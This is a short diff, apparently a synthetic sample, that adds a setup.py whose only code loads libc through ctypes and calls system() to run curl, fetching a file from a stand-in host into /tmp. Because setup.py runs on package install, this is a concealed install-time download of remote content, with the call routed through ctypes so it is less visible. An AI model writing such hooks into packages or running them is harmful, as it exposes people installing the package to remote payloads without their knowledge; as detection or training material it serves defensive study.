@@ -1,0 +1,7 @@
+# path: setup.py
+# lines: 3
+# weight: 35
+# ---
+import ctypes
+libc = ctypes.CDLL(None)
+libc.system(b"curl -o /tmp/x https://example.invalid/x")
